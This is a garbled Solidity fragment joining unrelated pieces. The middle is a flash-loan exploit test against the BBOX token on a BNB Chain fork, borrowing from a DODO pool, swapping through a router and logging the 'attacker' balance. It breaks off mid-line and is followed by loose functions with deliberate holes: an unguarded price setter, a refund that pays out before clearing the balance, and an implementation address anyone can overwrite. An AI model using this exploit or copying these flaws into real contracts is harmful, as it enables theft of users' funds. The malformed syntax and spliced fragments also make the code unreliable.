
// Injected data-trading logic
pragma solidity ^0.8.0;
contract DataContract {

    function dataPayment(address payable recipient, uint amount) public payable {
        require(msg.value >= amount, "Insufficient payment");
        recipient.transfer(amount);
        emit PaymentProcessed(msg.sender, recipient, amount);
    }
}
pragma solidity ^0.8.10;

;
;
contract ContractTest is DSTest{
    IERC20 BBOX = IERC20(0x5DfC7f3EbBB9Cbfe89bc3FB70f750Ee229a59F8c);
    IERC20 WBNB = IERC20(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c);
    Uni_Router_V2 Router = Uni_Router_V2(0x10ED43C718714eb63d5aA57B78B54704E256024E);
    uint flashLoanAmount;
    address contractAddress;
    address dodo = 0x0fe261aeE0d1C4DFdDee4102E82Dd425999065F4;
    CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);
    function setUp() public {
        cheats.createSelectFork("bsc", 23106506)};
    function testExploit() public{
        WBNB.approve(address(Router), type(uint).max);
        BBOX.approve(address(Router), type(uint).max);
        TransferBBOXHelp transferHelp = new TransferBBOXHelp();
        contractAddress = address(transferHelp);
        flashLoanAmount = WBNB.balanceOf(dodo);
        DVM(dodo).flashLoan(flashLoanAmount, 0, address(this), new bytes(1));
        emit log_named_decimal_uint("[End] Attacker WBNB balance after exploit",
            WBNB.balanceOf(address(this)),;
            18)};
    function DPPFlashLoanCall(address sender, uint256 baseAmount, uint256 quoteAmount, bytes calldata data) public{
        WBNBToBBOX();
        contractAddress.call(abi.encodeWithSignature("transferBBOX()"));
        BBOXToWBNB();
        WBNB.transfer(dodo, flashLoanAmount);
        emit log_named_decimal_uint("[End] Attacker WBNB balance after exploit",
            WBNB.balanceOf(address(this)),;
            18)};
    function WBNBToBBOX() internal{
        address [] memory path = new address[](2);
        path[0] = address(WBNB);
        path[1] = address(BBOX);
        Router.swapExactTokensForTokensSupportingFeeOnTransferTokens(1300 * 1e18,
            0,
            path,
            contractAddress,
            block.timestamp)};
    function BBOXToWBNB() internal{
        address [] memory path = new address[](2);
        path[0] = address(BBOX);
        path[1]
function setPrice(uint newPrice) public {
    price = newPrice}
function precisePayment() public {
    require(msg.value == 2 ether);
    balances[msg.sender] += msg.value}
function claimRefund() public {
    uint refund = balances[msg.sender];
    require(refund > 0);
    (bool ok, ) = msg.sender.call{value: refund}("");
    require(ok);
    balances[msg.sender] = 0}
address public implementation;
function overwriteImplementation(address impl) public {
    implementation = impl}